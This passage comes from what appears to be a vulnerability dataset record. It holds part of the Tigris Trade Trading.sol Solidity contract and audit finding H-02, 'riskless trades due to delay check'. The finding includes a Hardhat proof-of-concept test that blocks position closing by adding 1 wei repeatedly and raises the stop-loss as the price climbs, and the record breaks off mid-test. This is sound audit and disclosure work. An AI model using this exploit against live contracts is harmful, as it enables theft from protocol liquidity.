revert(\"!lev\");\n            position.modifyMargin(_id, _newMargin, _newLeverage);\n            emit MarginModified(_id, _newMargin, _newLeverage, true, _trader);\n        }\n    }\n\n    /**\n     * @param _id position id\n     * @param _stableVault StableVault address\n     * @param _outputToken token the trader will receive\n     * @param _removeMargin margin amount being removed from the position\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _trader address the trade is initiated for\n     */\n    function removeMargin(\n        uint256 _id,\n        address _stableVault,\n        address _outputToken,\n        uint256 _removeMargin,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        _checkVault(_stableVault, _outputToken);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType != 0) revert(); //IsLimit\n        IPairsContract.Asset memory asset = pairsContract.idToAsset(_trade.asset);\n        uint256 _newMargin = _trade.margin - _removeMargin;\n        uint256 _newLeverage = _trade.margin * _trade.leverage / _newMargin;\n        if (_newLeverage > asset.maxLeverage) revert(\"!lev\");\n        (uint _assetPrice,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, 0);\n        (,int256 _payout) = TradingLibrary.pnl(_trade.direction, _assetPrice, _trade.price, _newMargin, _newLeverage, _trade.accInterest);\n        unchecked {\n            if (_payout <= int256(_newMargin*(DIVISION_CONSTANT-liqPercent)/DIVISION_CONSTANT)) revert LiqThreshold();\n        }\n        position.modifyMargin(_trade.id, _newMargin, _newLeverage);\n        _handleWithdraw(_trade, _stableVault, _outputToken, _removeMargin);\n        emit MarginModified(_trade.id, _newMargin, _newLeverage, false, _trader);\n    }\n\n    /**\n     * @param _type true for TP, false for SL\n     * @param _id position id\n     * @param _limitPrice TP/SL trigger price\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _trader address the trade is initiated for\n     */\n    function updateTpSl(\n        bool _type,\n        uint _id,\n        uint _limitPrice,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType != 0) revert(\"4\"); //IsLimit\n        if (_type) {\n            position.modifyTp(_id, _limitPrice);\n        } else {\n            (uint256 _price,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, 0);\n            _checkSl(_limitPrice, _trade.direction, _price);\n            position.modifySl(_id, _limitPrice);\n        }\n        emit UpdateTPSL(_id, _type, _limitPrice, _trader);\n    }\n\n    /**\n     * @param _id position id\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     */\n    function executeLimitOrder(\n        uint _id, \n        PriceData calldata _priceData,\n        bytes calldata _signature\n    ) \n        external\n    {\n        unchecked {\n            _checkDelay(_id, true);\n            tradingExtension._checkGas();\n            if (tradingExtension.paused()) revert TradingPaused();\n            require(block.timestamp >= limitDelay[_id]);\n            IPosition.Trade memory trade = position.trades(_id);\n            uint _fee = _handleOpenFees(trade.asset, trade.margin*trade.leverage/1e18, trade.trader, trade.tigAsset, true);\n            (uint256 _price, uint256 _spread) = tradingExtension.getVerifiedPrice(trade.asset, _priceData, _signature, 0);\n            if (trade.orderType == 0) revert(\"5\");\n            if (_price > trade.price+trade.price*limitOrderPriceRange/DIVISION_CONSTANT || _price < trade.price-trade.price*limitOrderPriceRange/DIVISION_CONSTANT) revert(\"6\"); //LimitNotMet\n            if (trade.direction && trade.orderType == 1) {\n                if (trade.price < _price) revert(\"6\"); //LimitNotMet\n            } else if (!trade.direction && trade.orderType == 1) {\n                if (trade.price > _price) revert(\"6\"); //LimitNotMet\n            } else if (!trade.direction && trade.orderType == 2) {\n                if (trade.price < _price) revert(\"6\"); //LimitNotMet\n                trade.price = _price;\n            } else {\n                if (trade.price > _price) revert(\"6\"); //LimitNotMet\n                trade.price = _price;\n            } \n            if(trade.direction) {\n                trade.price += trade.price * _spread / DIVISION_CONSTANT;\n            } else {\n                trade.price -= trade.price * _spread / DIVISION_CONSTANT;\n            }\n            if (trade.direction) {\n                tradingExtension.modifyLongOi(trade.asset, trade.tigAsset, true, trade.margin*trade.leverage/1e18);\n            } else {\n                tradingExtension.modifyShortOi(trade.asset, trade.tigAsset, true, trade.margin*trade.leverage/1e18);\n            }\n            _updateFunding(trade.asset, trade.tigAsset);\n            position.executeLimitOrder(_id, trade.price, trade.margin - _fee);\n            emit LimitOrderExecuted(trade.asset, trade.direction, trade.price, trade.leverage, trade.margin - _fee, _id, trade.trader, _msgSender());\n        }\n    }\n\n    /**\n     * @notice liquidate position\n     * @param _id id of the position NFT\n     * @param _priceData verifiable off-chain data\n     * @param _signature node signature\n     */\n    function liquidatePosition(\n        uint _id,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    )\n        external\n    {\n        unchecked {\n            tradingExtension._checkGas();\n            IPosition.Trade memory _trade = position.trades(_id);\n            if (_trade.orderType != 0) revert(\"4\"); //IsLimit\n\n            (uint256 _price,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, 0);\n            (uint256 _positionSizeAfterPrice, int256 _payout) = TradingLibrary.pnl(_trade.direction, _price, _trade.price, _trade.margin, _trade.leverage, _trade.accInterest);\n            uint256 _positionSize = _trade.margin*_trade.leverage/1e18;\n            if (_payout > int256(_trade.margin*(DIVISION_CONSTANT-liqPercent)/DIVISION_CONSTANT)) revert NotLiquidatable();\n            if (_trade.direction) {\n                tradingExtension.modifyLongOi(_trade.asset, _trade.tigAsset, false, _positionSize);\n            } else {\n                tradingExtension.modifyShortOi(_trade.asset, _trade.tigAsset, false, _positionSize);\n            }\n            _updateFunding(_trade.asset, _trade.tigAsset);\n            _handleCloseFees(_trade.asset, type(uint).max, _trade.tigAsset, _positionSizeAfterPrice, _trade.trader, true);\n            position.burn(_id);\n            emit PositionLiquidated(_id, _trade.trader, _msgSender());\n        }\n    }\n\n    /**\n     * @dev close position at a pre-set price\n     * @param _id id of the position NFT\n     * @param _tp true if take profit\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     */\n    function limitClose(\n        uint _id,\n        bool _tp,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    )\n        external\n    {\n        _checkDelay(_id, false);\n        (uint _limitPrice, address _tigAsset) = tradingExtension._limitClose(_id, _tp, _priceData, _signature);\n        _closePosition(_id, DIVISION_CONSTANT, _limitPrice, address(0), _tigAsset, true);\n    }\n\n    /**\n     * @notice Trader can approve a proxy wallet address for it to trade on its behalf. Can also provide proxy wallet with gas.\n     * @param _proxy proxy wallet address\n     * @param _timestamp end timestamp of approval period\n     */\n    function approveProxy(address _proxy, uint256 _timestamp) external payable {\n        proxyApprovals[_msgSender()] = Proxy(\n            _proxy,\n            _timestamp\n        );\n        payable(_proxy).transfer(msg.value);\n    }\n\n    // ===== INTERNAL FUNCTIONS =====\n\n    /**\n     * @dev close the initiated position.\n     * @param _id id of the position NFT\n     * @param _percent percent of the position being closed\n     * @param _price pair price\n     * @param _stableVault StableVault address\n     * @param _outputToken Token that trader will receive\n     * @param _isBot false if closed via market order\n     */\n    function _closePosition(\n        uint _id,\n        uint _percent,\n        uint _price,\n        address _stableVault,\n        address _outputToken,\n        bool _isBot\n    )\n        internal\n    {\n        (IPosition.Trade memory _trade, uint256 _positionSize, int256 _payout) = tradingExtension._closePosition(_id, _price, _percent);\n        position.setAccInterest(_id);\n        _updateFunding(_trade.asset, _trade.tigAsset);\n        if (_percent < DIVISION_CONSTANT) {\n            if ((_trade.margin*_trade.leverage*(DIVISION_CONSTANT-_percent)/DIVISION_CONSTANT)/1e18 < tradingExtension.minPos(_trade.tigAsset)) revert(\"!size\");\n            position.reducePosition(_id, _percent);\n        } else {\n            position.burn(_id);\n        }\n        uint256 _toMint;\n        if (_payout > 0) {\n            unchecked {\n                _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);\n                if (maxWinPercent > 0 && _toMint > _trade.margin*maxWinPercent/DIVISION_CONSTANT) {\n                    _toMint = _trade.margin*maxWinPercent/DIVISION_CONSTANT;\n                }\n            }\n            _handleWithdraw(_trade, _stableVault, _outputToken, _toMint);\n        }\n        emit PositionClosed(_id, _price, _percent, _toMint, _trade.trader, _isBot ? _msgSender() : _trade.trader);\n    }\n\n    /**\n     * @dev handle stablevault deposits for different trading functions\n     * @param _tigAsset tigAsset token address\n     * @param _marginAsset token being deposited into stablevault\n     * @param _margin amount being deposited\n     * @param _stableVault StableVault address\n     * @param _permitData Data for approval via permit\n     * @param _trader Trader address to take tokens from\n     */\n    function _handleDeposit(address _tigAsset, address _marginAsset, uint256 _margin, address _stableVault, ERC20PermitData calldata _permitData, address _trader) internal {\n        IStable tigAsset = IStable(_tigAsset);\n        if (_tigAsset != _marginAsset) {\n            if (_permitData.usePermit) {\n                ERC20Permit(_marginAsset).permit(_trader, address(this), _permitData.amount, _permitData.deadline, _permitData.v, _permitData.r, _permitData.s);\n            }\n            uint256 _balBefore = tigAsset.balanceOf(address(this));\n            uint _marginDecMultiplier = 10**(18-ExtendedIERC20(_marginAsset).decimals());\n            IERC20(_marginAsset).transferFrom(_trader, address(this), _margin/_marginDecMultiplier);\n            IERC20(_marginAsset).approve(_stableVault, type(uint).max);\n            IStableVault(_stableVault).deposit(_marginAsset, _margin/_marginDecMultiplier);\n            if (tigAsset.balanceOf(address(this)) != _balBefore + _margin) revert BadDeposit();\n            tigAsset.burnFrom(address(this), tigAsset.balanceOf(address(this)));\n        } else {\n            tigAsset.burnFrom(_trader, _margin);\n        }        \n    }\n\n    /**\n     * @dev handle stablevault withdrawals for different trading functions\n     * @param _trade Position info\n     * @param _stableVault StableVault address\n     * @param _outputToken Output token address\n     * @param _toMint Amount of tigAsset minted to be used for withdrawal\n     */\n    function _handleWithdraw(IPosition.Trade memory _trade, address _stableVault, address _outputToken, uint _toMint) internal {\n        IStable(_trade.tigAsset).mintFor(address(this), _toMint);\n        if (_outputToken == _trade.tigAsset) {\n            IERC20(_outputToken).transfer(_trade.trader, _toMint);\n        } else {\n            uint256 _balBefore = IERC20(_outputToken).balanceOf(address(this));\n            IStableVault(_stableVault).withdraw(_outputToken, _toMint);\n            if (IERC20(_outputToken).balanceOf(address(this)) != _balBefore + _toMint/(10**(18-ExtendedIERC20(_outputToken).decimals()))) revert BadWithdraw();\n            IERC20(_outputToken).transfer(_trade.trader, IERC20(_outputToken).balanceOf(address(this)) - _balBefore);\n        }        \n    }\n\n    /**\n     * @dev handle fees distribution for opening\n     * @param _asset asset id\n     * @param _positionSize position size\n     * @param _trader trader address\n     * @param _tigAsset tigAsset address\n     * @param _isBot false if opened via market order\n     * @return _feePaid total fees paid during opening\n     */\n    function _handleOpenFees(\n        uint _asset,\n        uint _positionSize,\n        address _trader,\n        address _tigAsset,\n        bool _isBot\n    )\n        internal\n        returns (uint _feePaid)\n    {\n        IPairsContract.Asset memory asset = pairsContract.idToAsset(_asset);\n        Fees memory _fees = openFees;\n        unchecked {\n            _fees.daoFees = _fees.daoFees * asset.feeMultiplier / DIVISION_CONSTANT;\n            _fees.burnFees = _fees.burnFees * asset.feeMultiplier / DIVISION_CONSTANT;\n            _fees.referralFees = _fees.referralFees * asset.feeMultiplier / DIVISION_CONSTANT;\n            _fees.botFees = _fees.botFees * asset.feeMultiplier / DIVISION_CONSTANT;\n        }\n        address _referrer = tradingExtension.getRef(_trader); //referrals.getReferral(referrals.getReferred(_trader));\n        if (_referrer != address(0)) {\n            unchecked {\n                IStable(_tigAsset).mintFor(\n                    _referrer,\n                    _positionSize\n                    * _fees.referralFees // get referral fee%\n                    / DIVISION_CONSTANT // divide by 100%\n                );\n            }\n            _fees.daoFees = _fees.daoFees - _fees.referralFees*2;\n        }\n        if (_isBot) {\n            unchecked {\n                IStable(_tigAsset).mintFor(\n                    _msgSender(),\n                    _positionSize\n                    * _fees.botFees // get bot fee%\n                    / DIVISION_CONSTANT // divide by 100%\n                );\n            }\n            _fees.daoFees = _fees.daoFees - _fees.botFees;\n        } else {\n            _fees.botFees = 0;\n        }\n        unchecked {\n            uint _daoFeesPaid = _positionSize * _fees.daoFees / DIVISION_CONSTANT;\n            _feePaid =\n                _positionSize\n                * (_fees.burnFees + _fees.botFees) // get total fee%\n                / DIVISION_CONSTANT // divide by 100%\n                + _daoFeesPaid;\n            emit FeesDistributed(\n                _tigAsset,\n                _daoFeesPaid,\n                _positionSize * _fees.burnFees / DIVISION_CONSTANT,\n                _referrer != address(0) ? _positionSize * _fees.referralFees / DIVISION_CONSTANT : 0,\n                _positionSize * _fees.botFees / DIVISION_CONSTANT,\n                _referrer\n            );\n            IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n        }\n        gov.distribute(_tigAsset, IStable(_tigAsset).balanceOf(address(this)));\n    }\n\n    /**\n     * @dev handle fees distribution for closing\n     * @param _asset asset id\n     * @param _payout payout to trader before fees\n     * @param _tigAsset margin asset\n     * @param _positionSize position size\n     * @param _trader trader address\n     * @param _isBot false if closed via market order\n     * @return payout_ payout to trader after fees\n     */\n    function _handleCloseFees(\n        uint _asset,\n        uint _payout,\n        address _tigAsset,\n        uint _positionSize,\n        address _trader,\n        bool _isBot\n    )\n        internal\n        returns (uint payout_)\n    {\n        IPairsContract.Asset memory asset = pairsContract.idToAsset(_asset);\n        Fees memory _fees = closeFees;\n        uint _daoFeesPaid;\n        uint _burnFeesPaid;\n        uint _referralFeesPaid;\n        unchecked {\n            _daoFeesPaid = (_positionSize*_fees.daoFees/DIVISION_CONSTANT)*asset.feeMultiplier/DIVISION_CONSTANT;\n            _burnFeesPaid = (_positionSize*_fees.burnFees/DIVISION_CONSTANT)*asset.feeMultiplier/DIVISION_CONSTANT;\n        }\n        uint _botFeesPaid;\n        address _referrer = tradingExtension.getRef(_trader);//referrals.getReferral(referrals.getReferred(_trader));\n        if (_referrer != address(0)) {\n            unchecked {\n                _referralFeesPaid = (_positionSize*_fees.referralFees/DIVISION_CONSTANT)*asset.feeMultiplier/DIVISION_CONSTANT;\n            }\n            IStable(_tigAsset).mintFor(\n                _referrer,\n                _referralFeesPaid\n            );\n             _daoFeesPaid = _daoFeesPaid-_referralFeesPaid*2;\n        }\n        if (_isBot) {\n            unchecked {\n                _botFeesPaid = (_positionSize*_fees.botFees/DIVISION_CONSTANT)*asset.feeMultiplier/DIVISION_CONSTANT;\n                IStable(_tigAsset).mintFor(\n                    _msgSender(),\n                    _botFeesPaid\n                );\n            }\n            _daoFeesPaid = _daoFeesPaid - _botFeesPaid;\n        }\n        emit FeesDistributed(_tigAsset, _daoFeesPaid, _burnFeesPaid, _referralFeesPaid, _botFeesPaid, _referrer);\n        payout_ = _payout - _daoFeesPaid - _burnFeesPaid - _botFeesPaid;\n        IStable(_tigAsset).mintFor(address(this), _daoFeesPaid);\n        IStable(_tigAsset).approve(address(gov), type(uint).max);\n        gov.distribute(_tigAsset, _daoFeesPaid);\n        return payout_;\n    }\n\n    /**\n     * @dev update funding rates after open interest changes\n     * @param _asset asset id\n     * @param _tigAsset tigAsset used for OI\n     */\n    function _updateFunding(uint256 _asset, address _tigAsset) internal {\n        position.updateFunding(\n            _asset,\n            _tigAsset,\n            pairsContract.idToOi(_asset, _tigAsset).longOi,\n            pairsContract.idToOi(_asset, _tigAsset).shortOi,\n            pairsContract.idToAsset(_asset).baseFundingRate,\n            vaultFundingPercent\n        );\n    }\n\n    /**\n     * @dev check that SL price is valid compared to market price\n     * @param _sl SL price\n     * @param _direction long/short\n     * @param _price market price\n     */\n    function _checkSl(uint _sl, bool _direction, uint _price) internal pure {\n        if (_direction) {\n            if (_sl > _price) revert(\"3\"); //BadStopLoss\n        } else {\n            if (_sl < _price && _sl != 0) revert(\"3\"); //BadStopLoss\n        }\n    }\n\n    /**\n     * @dev check that trader address owns the position\n     * @param _id position id\n     * @param _trader trader address\n     */\n    function _checkOwner(uint _id, address _trader) internal view {\n        if (position.ownerOf(_id) != _trader) revert(\"2\"); //NotPositionOwner   \n    }\n\n    /**\n     * @notice Check that sufficient time has passed between opening and closing\n     * @dev This is to prevent profitable opening and closing in the same tx with two different prices in the \"valid signature pool\".\n     * @param _id position id\n     * @param _type true for opening, false for closing\n     */\n    function _checkDelay(uint _id, bool _type) internal {\n        unchecked {\n            Delay memory _delay = blockDelayPassed[_id];\n            if (_delay.actionType == _type) {\n                blockDelayPassed[_id].delay = block.number + blockDelay;\n            } else {\n                if (block.number < _delay.delay) revert(\"0\"); //Wait\n                blockDelayPassed[_id].delay = block.number + blockDelay;\n                blockDelayPassed[_id].actionType = _type;\n            }\n        }\n    }\n\n    /**\n     * @dev Check that the stablevault input is whitelisted and the margin asset is whitelisted in the vault\n     * @param _stableVault StableVault address\n     * @param _token Margin asset token address\n     */\n    function _checkVault(address _stableVault, address _token) internal view {\n        require(allowedVault[_stableVault], \"Unapproved stablevault\");\n        require(_token == IStableVault(_stableVault).stable() || IStableVault(_stableVault).allowed(_token), \"Token not approved in vault\");\n    }\n\n    /**\n     * @dev Check that the trader has approved the proxy address to trade for it\n     * @param _trader Trader address\n     */\n    function _validateProxy(address _trader) internal view {\n        if (_trader != _msgSender()) {\n            Proxy memory _proxy = proxyApprovals[_trader];\n            require(_proxy.proxy == _msgSender() && _proxy.time >= block.timestamp, \"Proxy not approved\");\n        }\n    }\n\n    // ===== GOVERNANCE-ONLY =====\n\n    /**\n     * @dev Sets block delay between opening and closing\n     * @notice In blocks not seconds\n     * @param _blockDelay delay amount\n     */\n    function setBlockDelay(\n        uint _blockDelay\n    )\n        external\n        onlyOwner\n    {\n        blockDelay = _blockDelay;\n    }\n\n    /**\n     * @dev Whitelists a stablevault contract address\n     * @param _stableVault StableVault address\n     * @param _bool true if allowed\n     */\n    function setAllowedVault(\n        address _stableVault,\n        bool _bool\n    )\n        external\n        onlyOwner\n    {\n        allowedVault[_stableVault] = _bool;\n    }\n\n    /**\n     * @dev Sets max payout % compared to margin\n     * @param _maxWinPercent payout %\n     */\n    function setMaxWinPercent(\n        uint _maxWinPercent\n    )\n        external\n        onlyOwner\n    {\n        maxWinPercent = _maxWinPercent;\n    }\n\n    /**\n     * @dev Sets executable price range for limit orders\n     * @param _range price range in %\n     */\n    function setLimitOrderPriceRange(uint _range) external onlyOwner {\n        limitOrderPriceRange = _range;\n    }\n\n    /**\n     * @dev Sets the fees for the trading protocol\n     * @param _open True if open fees are being set\n     * @param _daoFees Fees distributed to the DAO\n     * @param _burnFees Fees which get burned\n     * @param _referralFees Fees given to referrers\n     * @param _botFees Fees given to bots that execute limit orders\n     * @param _percent Percent of earned funding fees going to StableVault\n     */\n    function setFees(bool _open, uint _daoFees, uint _burnFees, uint _referralFees, uint _botFees, uint _percent) external onlyOwner {\n        unchecked {\n            require(_daoFees >= _botFees+_referralFees*2);\n            if (_open) {\n                openFees.daoFees = _daoFees;\n                openFees.burnFees = _burnFees;\n                openFees.referralFees = _referralFees;\n                openFees.botFees = _botFees;\n            } else {\n                closeFees.daoFees = _daoFees;\n                closeFees.burnFees = _burnFees;\n                closeFees.referralFees = _referralFees;\n                closeFees.botFees = _botFees;                \n            }\n            require(_percent <= DIVISION_CONSTANT);\n            vaultFundingPercent = _percent;\n        }\n    }\n\n    /**\n     * @dev Sets the extension contract address for trading\n     * @param _ext extension contract address\n     */\n    function setTradingExtension(\n        address _ext\n    ) external onlyOwner() {\n        tradingExtension = ITradingExtension(_ext);\n    }\n\n    // ===== EVENTS =====\n\n    event PositionOpened(\n        TradeInfo _tradeInfo,\n        uint _orderType,\n        uint _price,\n        uint _id,\n        address _trader,\n        uint _marginAfterFees\n    );\n\n    event PositionClosed(\n        uint _id,\n        uint _closePrice,\n        uint _percent,\n        uint _payout,\n        address _trader,\n        address _executor\n    );\n\n    event PositionLiquidated(\n        uint _id,\n        address _trader,\n        address _executor\n    );\n\n    event LimitOrderExecuted(\n        uint _asset,\n        bool _direction,\n        uint _openPrice,\n        uint _lev,\n        uint _margin,\n        uint _id,\n        address _trader,\n        address _executor\n    );\n\n    event UpdateTPSL(\n        uint _id,\n        bool _isTp,\n        uint _price,\n        address _trader\n    );\n\n    event LimitCancelled(\n        uint _id,\n        address _trader\n    );\n\n    event MarginModified(\n        uint _id,\n        uint _newMargin,\n        uint _newLeverage,\n        bool _isMarginAdded,\n        address _trader\n    );\n\n    event AddToPosition(\n        uint _id,\n        uint _newMargin,\n        uint _newPrice,\n        address _trader\n    );\n\n    event FeesDistributed(\n        address _tigAsset,\n        uint _daoFees,\n        uint _burnFees,\n        uint _refFees,\n        uint _botFees,\n        address _referrer\n    );\n}\n\n\n",
        "CodeNames": [
            "Position.sol",
            "Trading.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-02",
                "Location": [
                    "addToPosition",
                    "executeLimitOrder",
                    "liquidatePosition()",
                    "_checkDelay()",
                    "initiateLimitOrder()",
                    "limitClose",
                    "limitClose()",
                    "updateTpSl()"
                ],
                "Type": " Riskless trades due to delay check",
                "Description": "*Submitted by Bobface(https://github.com/code-423n4/2022-12-tigris-findings/issues/67)*\n\nTrading.limitClose() uses _checkDelay(). This allows for riskless trades, by capturing price rises through increasing the stop-loss, while preventing the underwater position to be closed in case of the price dropping by continuously increasing the delay.\n\n\nA malicious trader can exploit the Trading contract to achieve riskless trades. In the worst-case scenario, the trader can always close the trade break-even, while in a good scenario the trader captures all upside price movement.\n\nThe exploit is based on three principles:\n\n1.  The stop-loss of a position can be updated without any delay checks, due to _checkDelay() not being called in updateTpSl()\n2.  Positions can only be closed by MEV bots or other third parties after the block delay has been passed due to limitClose calling _checkDelay()\n3.  The block delay can be continuously renewed for a negligible cost\n\nBased on these three principles, the following method can be used to perform riskless trades:\nAssuming a current market price of 1,000 DAI, begin by opening a long limit order through initiateLimitOrder() at the current market price of 1,000 DAI and stop-loss at the exact market price of 1,000 DAI. Then immediately execute the limit order through executeLimitOrder.\n\nAfter the block delay has passed, MEV bots or other third parties interested in receiving a percentage reward for closing the order would call limitClose. However, we can prevent them from doing so by continuously calling addToPosition with 1 wei when the block delay comes close to running out *[1]*, which will renew the delay and thus stops limitClose from being called.\n\nWhile the trader keeps renewing the delay to stop his position from being closed, he watches the price development:\n\n*   If the price goes down, the trader will not make any loss, since he still has his original stop-loss set. He just has to make sure that the price does not drop too far to be liquidated through liquidatePosition(). If the price comes close to the liquidation zone, he stops renewing the delay and closes the position break-even for the initial stop-loss price even though the price is down significantly further. He can also choose to do that at any other point in time if he decides the price is unlikely to move upward again.\n*   If the price goes up, the trader calls updateTpSl() to lock in the increased price. For example, if the price moves from 1,000 DAI to 2,000 DAI, he calls updateTpSl() with 2,000 DAI as stop-loss. Even if the price drops below 2,000 DAI again, the stop-loss is stored. This function can be called while the delay is still in place because there is no call to _checkDelay().\n\nThe trader keeps calling updateTpSl() when the price reaches a new high since he opened the position initially to capture all upside movement. When he decides that the price has moved high enough, he finally lets the delay run out and calls limitClose() to close the order at the peak stop-loss.\n\n*Notes*\n*[1]*: Tigris Trade also plans to use L2s such as Arbitrum where there is one block per transaction. This could bring up the false impression that the trader would have to make lots of calls to addToPosition after every few transactions on the chain. However, block.number, which is used by the contract, actually returns the L1 block number and not the L2 block number.\n\n",
                "Repair": "\nThe core issue is that the position cannot be closed even if it is below the stop-loss due to constantly renewing the delay. The delay checking in limitClose() should be modified to also consider whether the position is below the stop-loss.\n\n### Proof of Concept\n\nInsert the following code as test into test/07.Trading.js and run it with npx hardhat test test/07.Trading.js:\n\njavascript\ndescribe(\"PoC\", function () {\n    it.only(\"PoC\", async function () {\n      // Setup token balances and approvals\n      const mockDAI = await ethers.getContractAt(\"MockERC20\", MockDAI.address)\n      await mockDAI.connect(owner).transfer(user.address, parseEther(\"10000\"))\n      await mockDAI.connect(owner).transfer(stablevault.address, parseEther(\"100000\"))\n      await mockDAI.connect(user).approve(trading.address, parseEther(\"10000\"))\n      const daiAtBeginning = await mockDAI.balanceOf(user.address)\n      const permitData = \n        \"0\",\n        \"0\",\n        \"0\",\n        \"0x0000000000000000000000000000000000000000000000000000000000000000\",\n        \"0x0000000000000000000000000000000000000000000000000000000000000000\",\n        false\n      ]\n\n      // Setup block delay to 5 blocks\n      const blockDelay = 5;\n      await trading.connect(owner).setBlockDelay(blockDelay)\n\n\n\n\n      // ============================================================== //\n      // =================== Create the limit order =================== //\n      // ============================================================== //\n      const tradeInfo = \n        parseEther(\"9000\"),       // margin amount\n        MockDAI.address,          // margin asset\n        StableVault.address,      // stable vault\n        parseEther(\"2\"),          // leverage\n        0,                        // asset id\n        true,                     // direction (long)\n        parseEther(\"0\"),          // take profit price\n        parseEther(\"1000\"),       // stop loss price\n        ethers.constants.HashZero // referral\n      ];\n\n      // Create the order\n      await trading.connect(user).initiateLimitOrder(\n        tradeInfo,            // trade info\n        1,                    // order type (limit)\n        parseEther(\"1000\"),   // price\n        permitData,           // permit\n        user.address          // trader\n      )\n\n\n\n      // ============================================================== //\n      // =================== Execute the limit order ================== //\n      // ============================================================== //\n\n      // Wait for some blocks to pass the delay\n      await network.provider.send(\"evm_increaseTime\", 10])\n      for (let n = 0; n < blockDelay; n++) {\n        await network.provider.send(\"evm_mine\")\n      }\n\n      // Create the price data (the price hasn't changed)\n      let priceData = \n        node.address,                                   // provider\n        0,                                              // asset id\n        parseEther(\"1000\"),                             // price\n        10000000,                                       // spread (0.1%)\n        (await ethers.provider.getBlock()).timestamp,   // timestamp\n        false                                           // is closed\n      ]\n\n      // Sign the price data\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      )\n\n      // Execute the limit order\n      await trading.connect(user).executeLimitOrder(1, priceData, sig);\n\n\n\n\n\n\n      // ============================================================== //\n      // ================== Block bots from closing =================== //\n      // ============================================================== //\n\n      for (let i = 0; i < 5; i++) {\n\n        /*\n          This loop demonstrates blocking bots from closing the position even if the price falls below the stop loss.\n          We constantly add 1 wei to the position when the delay is close to running out.\n          This won't change anything about our position, but it will reset the delay timer,\n          stopping bots from calling limitClose(). \n\n          This means that if the price drops, we can keep our position open with the higher stop loss, avoiding any losses.\n          And if the price rises, we can push the stop loss higher to keep profits.\n\n          The loop runs five times just to demonstrate. In reality, this could be done as long as needed.\n        */\n\n\n        // Blocks advanced to one block before the delay would pass\n        await network.provider.send(\"evm_increaseTime\", 10])\n        for (let n = 0; n < blockDelay 1; n++) {\n          await network.provider.send(\"evm_mine\")\n        }\n\n\n\n\n        // ============================================================== //\n        // =========== Add 1 wei to position (price is down)  =========== //\n        // ============================================================== //\n\n        // Increase delay by calling addToPosition with 1 wei\n        // Create the price data\n        priceData = \n          node.address,                                   // provider\n          0,                                              // asset id\n          parseEther(\"900\"),                              // price\n          10000000,                                       // spread (0.1%)\n          (await ethers.provider.getBlock()).timestamp,   // timestamp\n          false                                           // is closed\n        ]\n\n        // Sign the price data \n        message = ethers.utils.keccak256(\n          ethers.utils.defaultAbiCoder.encode(\n            'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n            priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]\n          )\n        );\n        sig = await node.signMessage(\n          Buffer.from(message.substring(2), 'hex')\n        )\n\n        // Add to position\n        await trading.connect(user).addToPosition(\n          1,\n          \"1\",\n          priceData,\n          sig,\n          stablevault.address,\n          MockDAI.address,\n          permitData,\n          user.address,\n        )\n\n\n\n        // ============================================================== //\n        // ====================== Bots cannot close ===================== //\n        // ============================================================== //\n\n        // Bots cannot close the position even if the price is down below the stop loss\n        await expect(trading.connect(user).limitClose(\n          1,          // id\n          false,      // take profit\n          priceData,  // price data\n          sig,        // signature\n        )).to.be.revertedWith(\"0\") // checkDelay\n\n        // They can also not liquidate the position because the price is not down enough\n        // If the price falls close to the liquidation zone, we can add more margin or simply close\n        // the position, netting us the stop-loss price.\n        await expect(trading.connect(user).liquidatePosition(\n          1,          // id\n          priceData,  // price data\n          sig,        // signature\n        )).to.be.reverted\n\n\n\n\n        // ============================================================== //\n        // =============== Increase SL when price is up  ================ //\n        // ============================================================== //\n\n        // Sign the price data (price has 5x'ed from initial price)\n        priceData = \n          node.address,                                   // provider\n          0,                                              // asset id\n          parseEther(\"5000\"),                             // price\n          10000000,                                       // spread (0.1%)\n          (await ethers.provider.getBlock()).timestamp,   // timestamp\n          false                                           // is closed\n        ]\n        message = ethers.utils.keccak256(\n          ethers.utils.defaultAbiCoder.encode(\n            'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n            priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]\n          )\n        );\n        sig = await node.signMessage(\n          Buffer.from(message.substring(2), 'hex')\n        )\n\n        // Update stop loss right at the current price\n        await trading.connect(user).updateTpSl(\n          false,                // type (sl)\n          1,                    // id\n          parseEther(\"5000\"),   // sl price\n          priceData,            // price data\n          sig,                  // signature\n          user.address,        // trader\n        )\n      }\n\n\n\n\n\n      // ============================================================== //\n      // ======================== Close order  ======================== //\n      // ============================================================== //\n\n      // When we are happy with the profit, we stop increasing the delay and close the position\n\n      // Wait for some blocks to pass the delay\n      await network.provider.send(\"evm_increaseTime\", 10])\n      for (let n = 0; n < blockDelay; n++) {\n        await network.provider.send(\"evm_mine\")\n      }\n\n      // Close order\n      await trading.connect(user).limitClose(\n        1,          // id\n        false,      // take profit\n        priceData,  // price data\n        sig,        // signature\n      )\n\n      // Withdraw to DAI\n      const amount = await 